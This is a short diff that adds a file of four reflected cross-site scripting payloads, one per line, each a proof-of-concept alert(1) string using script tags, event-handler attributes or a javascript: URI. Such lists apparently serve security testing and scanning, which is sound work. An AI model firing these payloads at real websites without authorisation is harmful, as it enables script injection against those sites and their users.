@@ -1,0 +1,5 @@
+# Reflected XSS payloads — one per line.
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><svg onload=alert(1)>
+javascript:alert(1)
